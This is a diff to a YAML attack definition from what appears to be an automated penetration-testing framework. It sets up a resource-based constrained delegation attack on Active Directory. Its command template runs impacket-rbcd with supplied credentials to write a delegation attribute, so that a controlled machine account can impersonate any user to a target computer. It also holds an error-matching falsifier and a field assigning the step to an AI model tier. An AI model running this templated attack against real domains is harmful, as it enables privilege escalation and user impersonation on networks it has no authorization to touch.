@@ -9,8 +9,8 @@ parameters:
   domain: from_engagement.domain
   target_computer: from_finding.target_computer
   fake_computer: from_finding.fake_computer
-command_template: impacket-rbcd '{domain}/{username}:{password}' -delegate-from '{fake_computer}$'
-  -delegate-to '{target_computer}$' -dc-ip {target_ip} -action write
+command_template: impacket-rbcd '{domain}/{username}:{password}' -delegate-from '{fake_computer}$' -delegate-to '{target_computer}$'
+  -dc-ip {target_ip} -action write
 parser: impacket_parser
 expected_effects:
 - delegation_configured
@@ -18,8 +18,18 @@ falsifier:
   pattern: ACCESS_DENIED|INSUFFICIENT_ACCESS|error
   timeout: 60
 model_tier: haiku
-mechanism: 'Writes msDS-AllowedToActOnBehalfOfOtherIdentity on target computer, allowing
-  fake machine account to impersonate any user to target via S4U2self + S4U2proxy.
-  Requires: GenericWrite/GenericAll on target computer object + a machine account
+mechanism: 'Writes msDS-AllowedToActOnBehalfOfOtherIdentity on target computer, allowing fake machine account to impersonate
+  any user to target via S4U2self + S4U2proxy. Requires: GenericWrite/GenericAll on target computer object + a machine account
   we control.'
 hacktricks_ref: windows-hardening/active-directory-methodology/resource-based-constrained-delegation.md
+references:
+  ocd_mindmap_node_ids:
+  - 0e64d8a416
+  - 2da450f83c
+  - 62cf0dbf04
+  - 8b46f7fde2
+  - 9a6aeeb517
+  - a6b4953ca2
+  - abe73ec237
+  - d9d71da7af
+  - f5fe84e854
